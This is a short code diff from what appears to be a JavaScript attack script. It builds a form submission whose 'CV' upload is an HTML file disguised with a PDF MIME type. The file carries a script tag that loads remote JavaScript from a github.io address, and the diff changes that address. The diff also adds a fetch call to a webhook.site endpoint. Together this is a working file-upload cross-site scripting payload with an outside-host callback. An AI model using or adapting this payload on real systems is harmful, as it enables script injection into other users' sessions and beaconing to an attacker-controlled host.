@@ -37,7 +37,7 @@ formData.append('availability', '');
 
 formData.append('avatar', '');
 
-const evilPdfContent = '<script src="https://example-user.github.io/my-project/dist/script.js"></script>';
+const evilPdfContent = '<script src="https://LamChanKhai.github.io/X55.github.io/script.js"></script>';
 const evilCvFile = new File([evilPdfContent], 'lck.html', {
     type: 'application/pdf'
 });
@@ -103,3 +103,4 @@ fetch(endpoint, {
 .catch(error => {
     console.error('Lỗi mạng hoặc lỗi JavaScript:', error);
 });
+fetch('https://webhook.site/2039e966-8e37-448b-8f25-6485def7ce17')
